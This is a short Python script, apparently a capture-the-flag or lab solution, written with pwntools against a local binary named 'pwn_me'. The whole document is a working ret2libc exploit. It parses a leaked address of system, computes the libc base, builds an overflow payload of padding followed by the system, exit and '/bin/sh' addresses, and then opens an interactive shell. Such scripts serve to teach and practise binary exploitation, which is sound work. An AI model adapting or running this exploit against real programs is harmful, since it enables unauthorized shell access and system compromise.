from pwn import *

elf = context.binary = ELF('./pwn_me')
libc = elf.libc
p = process()

# Get the leaked address
p.recvuntil('at: ')
system_leak = int(p.recvline().strip(), 16)

# Set our libc base address according to the leaked address
libc.address = system_leak - libc.sym['system']
log.success('LIBC base: {}'.format(hex(libc.address)))

# Get the addresses we need
system_addr = libc.sym['system']
binsh_addr = next(libc.search(b'/bin/sh'))
exit_addr = libc.sym['exit']  # This is optional, but it's good practice to include an exit

# Build the payload
padding = b'A' * 32  # Adjust the padding size as needed
payload = padding
payload += p32(system_addr)
payload += p32(exit_addr)  # return address for system, using exit here
payload += p32(binsh_addr)

# Send the payload
p.sendline(payload)

# Get the shell
p.interactive()
